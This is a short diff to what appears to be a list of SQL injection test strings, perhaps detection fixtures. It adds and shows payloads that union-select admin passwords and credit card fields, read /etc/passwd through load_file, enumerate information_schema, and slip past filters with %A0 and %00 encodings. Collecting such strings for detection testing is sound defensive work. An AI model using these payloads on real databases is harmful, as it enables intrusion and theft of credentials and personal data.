@@ -437,6 +437,8 @@ binary (binary 1) union select table_name from information_schema.tables
 @a mod (1) or 1 union select load_file('/etc/passwd'),credit_card,passwd from users-- -
 -1 procedure analyse(1gfsdgfds, sfg) union select table_name from information_schema.tables limit 1
 (select 1 foo) union select load_file('foo');
+#=1 union select admin,pass from admin limit 1
+#=1 union select 1,2,3,4,5,6
 's' || binary(1)# and n='foo"
 1 - binary (1 - binary(1)) UNION SELECT 2 --
 1 - binary (binary(1) -1) UNION SELECT 2 --
@@ -460,5 +462,6 @@ ANY(SELECT (1)) - 1 UNION ALL --
 ANY((SELECT 1)) - 1 UNION ALL --
 1 - ANY(SELECT 1) UNION ALL --
 1%A0UNION%A0SELECT%A02--
+1%00UNION%00SELECT%002--
 stringindatasetchoosen%25' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS where FULL_NAME like '%25dministrator' and rownum<=1 and PASSWORD like '0%25') and '1%25'='1
 -{``.``.id} union select table_name FROM information_schema.tables LIMIT 1
